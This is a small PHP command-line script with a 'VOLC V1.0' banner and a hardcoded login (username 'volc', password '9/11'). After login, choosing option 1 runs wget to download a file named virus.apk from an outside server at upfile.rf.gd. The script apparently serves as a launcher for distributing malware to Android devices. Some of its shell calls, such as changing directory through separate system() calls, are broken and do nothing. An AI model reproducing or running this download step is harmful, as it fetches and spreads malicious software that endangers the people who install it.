<?php

    

    $header = "
    \033[92m
    
db    db  .d88b.  db       .o88b.             
88    88 .8P  Y8. 88      d8P  Y8           
Y8    8P 88    88 88      8P              
`8b  d8' 88    88 88      8b               
 `8bd8'  `8b  d8' 88booo. Y8b  d8          
   YP     `Y88P'  Y88888P  `Y88P' V1.0    
        
      
      
      
      
      
       \n
        
        
        
        
        
        
        \n
    ";

    system("clear");
    system("sleep 2");
    
    echo "\033[92mWelcome to Volc . . .\n";
    
    echo "\033[92mLogin\n";
    
    echo "\033[92mUsername : ";
    $input_user = trim(fgets(STDIN));
    
    echo "\033[92mPassword : ";
    $input_user_password = trim(fgets(STDIN));
    
    if($input_user == "volc" && $input_user_password == "9/11"){
        echo "\n\033[92mLogin Success...\n";
        system("sleep 2");
        system("clear");
        
        echo $header;
        echo "\033[92m Type a number 1 to download application from my server\n";
        echo "\n";
        echo "=> ";
        $in = trim(fgets(STDIN));
        
        if($in == 1 || $in == 01){
            system("cd project");
            system("wget http://upfile.rf.gd/apkproject/myapk/virus.apk");
            echo "\033[92mDownload Success ^_^\n";
            system("../");
            exit();
        }
        else{
            echo "\033[91mNot found :(\n";
            exit();
        }
        
    }
    else{
        echo "\033[91mYou're not a user !!!";
        exit();
    }
    
?>